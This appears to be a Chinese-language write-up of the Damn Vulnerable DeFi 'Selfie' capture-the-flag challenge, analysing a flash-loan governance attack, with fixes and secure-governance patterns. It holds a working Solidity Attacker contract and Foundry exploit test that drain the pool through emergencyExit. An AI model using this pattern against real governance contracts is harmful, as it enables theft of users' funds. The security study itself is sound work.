# Selfie 漏洞分析

## 1. 合约功能概述

`SelfiePool` 是一个提供免费闪电贷的 DVT 代币池，集成了去中心化治理机制来控制池子。

**核心组件：**
- **SelfiePool.sol**: 闪电贷池，持有 1,500,000 DVT 代币
- **SimpleGovernance.sol**: 治理合约，允许持有超过 50% 投票权的人提交提案
- **DamnValuableVotes.sol**: ERC20Votes 代币，支持投票和委托

**业务流程：**
1. 池子提供免费 DVT 闪电贷
2. 治理合约允许提案和执行操作（2 天延迟）
3. 提案需要超过 50% 的投票权才能提交
4. `emergencyExit()` 可以将池子资金转移到指定地址（仅治理可调用）

---

## 2. 漏洞位置

### 漏洞一：闪电贷期间的投票权（SimpleGovernance.sol#L22-L47）

```solidity
function queueAction(address target, uint128 value, bytes calldata data) 
    external 
    returns (uint256 actionId) 
{
    // ⚠️ 漏洞1: 只检查当前时刻的投票权
    if (!_hasEnoughVotes(msg.sender)) {
        revert NotEnoughVotes(msg.sender);
    }

    if (target == address(this)) {
        revert InvalidTarget();
    }

    if (data.length > 0 && target.code.length == 0) {
        revert TargetMustHaveCode();
    }

    actionId = _actionCounter;

    _actions[actionId] = GovernanceAction({
        target: target,
        value: value,
        proposedAt: uint64(block.timestamp),
        executedAt: 0,
        data: data
    });

    unchecked {
        _actionCounter++;
    }

    emit ActionQueued(actionId, msg.sender);
}

function _hasEnoughVotes(address who) private view returns (bool) {
    uint256 balance = _votingToken.getVotes(who);
    uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
    // ⚠️ 需要超过 50% 投票权
    return balance > halfTotalSupply;
}
```

### 漏洞二：特权函数（SelfiePool.sol#L66-L71）

```solidity
function emergencyExit(address receiver) external onlyGovernance {
    uint256 amount = token.balanceOf(address(this));
    token.transfer(receiver, amount);

    emit EmergencyExit(receiver, amount);
}
```

### 漏洞三：闪电贷实现（SelfiePool.sol#L48-L64）

```solidity
function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data)
    external
    nonReentrant
    returns (bool)
{
    if (_token != address(token)) {
        revert UnsupportedCurrency();
    }

    // ⚠️ 转出代币（包括投票权）
    token.transfer(address(_receiver), _amount);
    
    if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS) {
        revert CallbackFailed();
    }

    if (!token.transferFrom(address(_receiver), address(this), _amount)) {
        revert RepayFailed();
    }

    return true;
}
```

---

## 3. 漏洞原理分析

### 3.1 ERC20Votes 的投票权机制

**DamnValuableVotes 继承 ERC20Votes：**
```solidity
// 投票权 = 被委托的代币数量
function getVotes(address account) public view returns (uint256) {
    return _delegateCheckpoints[account].latest();
}

// 用户必须先委托（给自己或他人）才有投票权
function delegate(address delegatee) public {
    _delegate(_msgSender(), delegatee);
}
```

**关键点：**
- 持有代币 ≠ 拥有投票权
- 必须调用 `delegate()` 才能激活投票权
- 委托后，投票权立即生效

### 3.2 闪电贷期间获取投票权

**正常流程（无法攻击）：**
```
攻击者余额: 0 DVT
攻击者投票权: 0
无法提交提案 ❌
```

**利用闪电贷：**
```
1. 借出 1,500,000 DVT（池子全部代币）
2. 在 onFlashLoan 回调中:
   - delegate(攻击者自己)
   - 投票权 = 1,500,000（75% > 50%）✅
   - queueAction(pool.emergencyExit(recovery))
3. 归还代币
4. 等待 2 天
5. executeAction() → 提取所有资金
```

### 3.3 时间窗口漏洞

**治理的时间检查：**
```solidity
function queueAction(...) external returns (uint256 actionId) {
    // ⚠️ 只检查提交时的投票权
    if (!_hasEnoughVotes(msg.sender)) {
        revert NotEnoughVotes(msg.sender);
    }
    
    // 记录提案
    _actions[actionId] = GovernanceAction({...});
}

function executeAction(uint256 actionId) external payable {
    // ⚠️ 执行时不再检查投票权
    if (!_canBeExecuted(actionId)) {
        revert CannotExecute(actionId);
    }
    
    // 直接执行
    actionToExecute.target.functionCallWithValue(...);
}
```

**问题：**
- 提交提案时检查投票权
- 执行提案时不再检查
- 攻击者可以临时借用投票权提交提案，归还后仍能执行

### 3.4 为什么会有这个漏洞

**根本原因：**
1. **瞬时投票权**: 闪电贷期间可以临时获得大量投票权
2. **延迟执行**: 提案执行延迟 2 天，给攻击者时间归还代币
3. **权限校验缺失**: 执行时不重新验证投票权
4. **治理逻辑缺陷**: 没有考虑闪电贷场景

**设计缺陷：**
- ERC20Votes 的投票权是"余额快照"，可以被闪电贷操纵
- 治理合约假设"提案者在执行时仍持有投票权"
- `emergencyExit()` 没有额外的时间锁或多签保护

---

## 4. 修复方案

### 方案一：检查平均投票权（推荐）

```solidity
function queueAction(address target, uint128 value, bytes calldata data) 
    external 
    returns (uint256 actionId) 
{
    // ✅ 检查过去一段时间的平均投票权
    if (!_hasEnoughVotesOverTime(msg.sender)) {
        revert NotEnoughVotes(msg.sender);
    }
    
    // ... rest of the code
}

function _hasEnoughVotesOverTime(address who) private view returns (bool) {
    // 检查过去 N 个区块的平均投票权
    uint256 currentBlock = block.number;
    uint256 avgVotes = 0;
    
    for (uint256 i = 0; i < VOTE_AVERAGING_BLOCKS; i++) {
        avgVotes += _votingToken.getPastVotes(who, currentBlock - i);
    }
    
    avgVotes /= VOTE_AVERAGING_BLOCKS;
    uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
    
    return avgVotes > halfTotalSupply;
}
```

**为什么有效：**
- 闪电贷只在单个区块内有效
- 平均投票权无法通过单个区块的投票权提升来操纵
- 需要长期持有代币才能提案

### 方案二：执行时重新验证（部分有效）

```solidity
function executeAction(uint256 actionId) external payable returns (bytes memory) {
    if (!_canBeExecuted(actionId)) {
        revert CannotExecute(actionId);
    }

    GovernanceAction storage actionToExecute = _actions[actionId];
    
    // ✅ 重新检查提案者的投票权
    // ❌ 但这要求跟踪原始提案者
    address proposer = _actionProposers[actionId];
    if (!_hasEnoughVotes(proposer)) {
        revert ProposerLostVotes(proposer);
    }

    actionToExecute.executedAt = uint64(block.timestamp);
    emit ActionExecuted(actionId, msg.sender);

    return actionToExecute.target.functionCallWithValue(actionToExecute.data, actionToExecute.value);
}
```

**权衡：**
- ✅ 防止投票权消失后执行提案
- ❌ 仍然无法防止闪电贷攻击（2天后攻击者可以再次借用投票权）
- ⚠️ 需要修改数据结构记录提案者

### 方案三：锁定投票权（最安全）

```solidity
function queueAction(address target, uint128 value, bytes calldata data) 
    external 
    returns (uint256 actionId) 
{
    uint256 requiredVotes = _votingToken.totalSupply() / 2;
    
    if (_votingToken.getVotes(msg.sender) <= requiredVotes) {
        revert NotEnoughVotes(msg.sender);
    }

    // ✅ 锁定提案者的投票权
    _votingToken.lockVotes(msg.sender, requiredVotes, ACTION_DELAY_IN_SECONDS);

    actionId = _actionCounter;
    _actions[actionId] = GovernanceAction({...});
    _actionProposers[actionId] = msg.sender;

    unchecked {
        _actionCounter++;
    }

    emit ActionQueued(actionId, msg.sender);
}
```

**为什么有效：**
- 提案者的投票权被锁定，无法转移或归还
- 闪电贷无法在单个交易内锁定长期投票权
- 需要修改 ERC20Votes 合约添加锁定机制

### 方案四：禁用闪电贷期间的投票

```solidity
// 在 SelfiePool 中
bool private _flashLoanInProgress;

function flashLoan(...) external nonReentrant returns (bool) {
    _flashLoanInProgress = true;
    
    token.transfer(address(_receiver), _amount);
    
    if (_receiver.onFlashLoan(...) != CALLBACK_SUCCESS) {
        revert CallbackFailed();
    }
    
    _flashLoanInProgress = false;
    
    // ...
}

// 在 DamnValuableVotes 中
function delegate(address delegatee) public override {
    // ✅ 禁止在闪电贷期间委托
    if (pool.isFlashLoanInProgress()) {
        revert CannotDelegateDuringFlashLoan();
    }
    
    super.delegate(delegatee);
}
```

**权衡：**
- ✅ 直接阻止攻击向量
- ❌ 需要代币合约知道池子的状态（耦合）
- ❌ 复杂度高，可能引入新问题

---

## 5. Proof of Concept

### 攻击合约

```solidity
contract Attacker is IERC3156FlashBorrower {
    bytes32 private constant CALLBACK_SUCCESS = 
        keccak256("ERC3156FlashBorrower.onFlashLoan");
    
    DamnValuableVotes public token;
    SimpleGovernance public governance;
    SelfiePool public pool;
    address public recovery;
    uint256 public actionId;

    constructor(
        DamnValuableVotes _token,
        SimpleGovernance _governance,
        SelfiePool _pool,
        address _recovery
    ) {
        token = _token;
        governance = _governance;
        pool = _pool;
        recovery = _recovery;
    }

    // 闪电贷回调
    function onFlashLoan(
        address initiator,
        address tokenAddress,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // 步骤1: 委托给自己，激活投票权
        token.delegate(address(this));
        
        // 验证投票权
        uint256 votes = token.getVotes(address(this));
        require(votes > token.totalSupply() / 2, "Not enough votes");
        
        // 步骤2: 提交恶意提案
        bytes memory emergencyExitData = abi.encodeWithSelector(
            SelfiePool.emergencyExit.selector,
            recovery
        );
        
        actionId = governance.queueAction(
            address(pool),
            0,
            emergencyExitData
        );
        
        // 步骤3: 批准池子提取代币（归还闪电贷）
        token.approve(address(pool), amount);
        
        return CALLBACK_SUCCESS;
    }
}
```

### 攻击流程详解

```
初始状态:
├─ Pool: 1,500,000 DVT
├─ Attacker: 0 DVT, 0 投票权
└─ Recovery: 0 DVT

阶段1: 提交提案（区块 N）
│
├─ [1] pool.flashLoan(attacker, DVT, 1500000e18, "")
│   │
│   ├─ transfer(attacker, 1500000 DVT)
│   │   → attacker balance = 1,500,000 DVT
│   │
│   ├─ attacker.onFlashLoan(...)
│   │   │
│   │   ├─ token.delegate(attacker)
│   │   │   → attacker 投票权 = 1,500,000 (75%)
│   │   │
│   │   ├─ governance.queueAction(
│   │   │       pool.emergencyExit(recovery)
│   │   │   )
│   │   │   └─ 检查: 1,500,000 > 1,000,000 ✅
│   │   │   └─ 提案 ID = 1, proposedAt = block.timestamp
│   │   │
│   │   └─ token.approve(pool, 1500000 DVT)
│   │
│   └─ transferFrom(attacker, pool, 1500000 DVT)
│       → attacker balance = 0 DVT
│       → attacker 投票权 = 0 (代币已归还)
│
阶段2: 等待延迟（区块 N + 2 days）
│
└─ vm.warp(block.timestamp + 2 days)

阶段3: 执行提案
│
├─ [2] governance.executeAction(1)
│   │
│   ├─ 检查: proposedAt + 2 days <= now ✅
│   ├─ 检查: executedAt == 0 ✅
│   │   → ⚠️ 不检查当前投票权！
│   │
│   └─ pool.emergencyExit(recovery)
│       └─ transfer(recovery, 1500000 DVT)
│
最终状态:
├─ Pool: 0 DVT
├─ Attacker: 0 DVT
└─ Recovery: 1,500,000 DVT ✅
```

### 关键技术点

1. **临时投票权**
```solidity
// 借用代币 → 获得投票权
token.transfer(attacker, amount);
token.delegate(attacker);  // 投票权 = amount

// 归还代币 → 失去投票权
token.transfer(pool, amount);  // 投票权 = 0

// 但提案已经提交！
```

2. **治理延迟的利用**
```solidity
// 提交时需要投票权
queueAction() → 检查 getVotes(msg.sender) > 50% ✅

// 执行时不再检查
executeAction() → 不检查投票权 ❌

// 时间差: 2 天
// 攻击者有充足时间归还代币
```

3. **ERC20Votes 的委托机制**
```solidity
// 余额和投票权分离
balanceOf(attacker) = 1,500,000
getVotes(attacker) = 0  // 未委托

// 委托后投票权立即生效
delegate(attacker);
getVotes(attacker) = 1,500,000 ✅
```

---

## 6. 关键要点总结

| 维度 | 说明 |
|------|------|
| **攻击成本** | 无需初始资金（利用免费闪电贷）|
| **攻击影响** | 完全掏空池子（1,500,000 DVT）|
| **漏洞类型** | 治理攻击 + 闪电贷投票权操纵 |
| **根本原因** | 瞬时投票权 + 延迟执行 + 权限验证缺失 |
| **修复难度** | 中等，需要修改治理机制 |
| **安全启示** | 治理投票权不应该可以被闪电贷临时获得 |

---

## 7. 扩展思考

### 类似漏洞模式

1. **Flash Loan Governance Attack**: 利用闪电贷获得治理权
2. **Voting Power Manipulation**: 操纵投票权进行恶意提案
3. **Time-Delayed Execution**: 利用执行延迟进行攻击
4. **Snapshot Bypass**: 绕过投票权快照机制

### 真实案例参考

**Beanstalk (2022) - 1.82 亿美元损失**
```
攻击者:
1. 通过闪电贷借入 10 亿美元的资产
2. 在 Beanstalk 中换取治理代币
3. 提交并立即执行提案（利用紧急提案机制）
4. 提案内容: 将资金转移到攻击者地址
5. 归还闪电贷，净赚 8000 万美元
```

**Tornado Cash Governance Attack (2023)**
```
攻击者:
1. 积累足够的投票权
2. 提交恶意提案修改合约逻辑
3. 社区未及时发现和阻止
4. 提案执行，攻击者控制治理
```

**Build Finance (2021)**
```
攻击者:
1. 利用闪电贷获得治理代币
2. 在单个区块内提交和执行提案
3. 提案: 铸造大量新代币给自己
4. 项目代币价值归零
```

### 防御最佳实践

```solidity
✅ DO: 使用投票权快照（过去区块的投票权）
✅ DO: 执行时重新验证提案者的投票权
✅ DO: 锁定提案者的投票权直到提案执行或取消
✅ DO: 使用 Timelock 增加额外的延迟和审查期
✅ DO: 实现提案取消机制
✅ DO: 对关键操作使用多签或更高的投票门槛
❌ DON'T: 允许单区块内获得和使用投票权
❌ DON'T: 假设提案者在执行时仍持有投票权
❌ DON'T: 对所有提案使用相同的投票门槛
❌ DON'T: 忽视闪电贷对治理的威胁
```

### 安全的治理设计

```solidity
contract SecureGovernance {
    // ✅ 使用过去的投票权快照
    function queueAction(...) external returns (uint256) {
        uint256 proposalBlock = block.number;
        uint256 snapshotBlock = proposalBlock - SNAPSHOT_DELAY;
        
        // 检查快照时刻的投票权
        uint256 votes = token.getPastVotes(msg.sender, snapshotBlock);
        require(votes > token.totalSupply() / 2, "Not enough votes");
        
        // 记录提案者
        _actionProposers[actionId] = msg.sender;
        
        // ...
    }
    
    // ✅ 执行时再次验证
    function executeAction(uint256 actionId) external {
        address proposer = _actionProposers[actionId];
        
        // 提案者必须仍然持有足够投票权
        require(
            token.getVotes(proposer) > token.totalSupply() / 2,
            "Proposer lost votes"
        );
        
        // ...
    }
    
    // ✅ 允许社区取消恶意提案
    function cancelAction(uint256 actionId) external {
        // 需要更高的投票权（如 60%）
        require(
            token.getVotes(msg.sender) > token.totalSupply() * 60 / 100,
            "Not enough votes to cancel"
        );
        
        delete _actions[actionId];
    }
}
```

### Compound 式的安全治理

```solidity
// Compound Governor 的安全特性
contract CompoundLikeGovernor {
    // 1. 提案门槛: 1% 总供应量
    uint256 public constant PROPOSAL_THRESHOLD = TOTAL_SUPPLY / 100;
    
    // 2. 投票延迟: 提案后 1 天才能投票
    uint256 public constant VOTING_DELAY = 1 days;
    
    // 3. 投票期: 3 天
    uint256 public constant VOTING_PERIOD = 3 days;
    
    // 4. 执行延迟: 投票通过后 2 天才能执行
    uint256 public constant EXECUTION_DELAY = 2 days;
    
    // 5. 投票权快照: 使用提案时的投票权
    function propose(...) external returns (uint256) {
        uint256 proposalSnapshot = block.number - 1;
        uint256 proposerVotes = token.getPastVotes(msg.sender, proposalSnapshot);
        
        require(proposerVotes >= PROPOSAL_THRESHOLD);
        // ...
    }
}
```

---

## 附录：完整测试代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieExploitTest is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    function setUp() public {
        vm.startPrank(deployer);

        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);
        governance = new SimpleGovernance(token);
        pool = new SelfiePool(token, governance);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    function testExploit() public {
        vm.startPrank(player);
        
        // 部署攻击合约
        Attacker attacker = new Attacker(token, governance, pool, recovery);
        
        // 发起闪电贷攻击
        pool.flashLoan(
            attacker,
            address(token),
            TOKENS_IN_POOL,
            ""
        );
        
        vm.stopPrank();
        
        // 等待 2 天
        vm.warp(block.timestamp + 2 days + 1);
        
        // 执行提案
        vm.prank(player);
        uint256 actionId = attacker.actionId();
        governance.executeAction(actionId);
        
        // 验证
        assertEq(token.balanceOf(address(pool)), 0);
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL);
        
        console.log("[+] Exploit successful!");
        console.log("    Pool balance:", token.balanceOf(address(pool)));
        console.log("    Recovery balance:", token.balanceOf(recovery));
    }
}

contract Attacker is IERC3156FlashBorrower {
    bytes32 private constant CALLBACK_SUCCESS = 
        keccak256("ERC3156FlashBorrower.onFlashLoan");
    
    DamnValuableVotes public token;
    SimpleGovernance public governance;
    SelfiePool public pool;
    address public recovery;
    uint256 public actionId;

    constructor(
        DamnValuableVotes _token,
        SimpleGovernance _governance,
        SelfiePool _pool,
        address _recovery
    ) {
        token = _token;
        governance = _governance;
        pool = _pool;
        recovery = _recovery;
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        // 委托给自己，获得投票权
        token.delegate(address(this));
        
        // 提交恶意提案
        bytes memory data = abi.encodeWithSelector(
            SelfiePool.emergencyExit.selector,
            recovery
        );
        
        actionId = governance.queueAction(address(pool), 0, data);
        
        // 批准归还
        token.approve(address(pool), amount);
        
        return CALLBACK_SUCCESS;
    }
}
```

**运行测试：**
```bash
forge test --match-test testExploit -vvvv
```

---

## 总结

Selfie 展示了一个复杂的治理攻击：

**核心问题：** 闪电贷可以临时获得投票权，提交提案后归还代币，延迟执行提案

**攻击链条：**
1. 闪电贷借出大量代币
2. 委托给自己获得投票权
3. 提交 emergencyExit 提案
4. 归还代币（失去投票权）
5. 等待 2 天
6. 执行提案掏空池子

**防御要点：**
- 使用投票权快照（过去区块）
- 执行时重新验证投票权
- 锁定提案者的投票权
- 增加提案取消机制

这是 DeFi 中最危险的攻击模式之一，已经在真实世界造成了数亿美元的损失。它提醒我们：**治理机制必须考虑闪电贷场景，不能假设投票权是稳定的。**
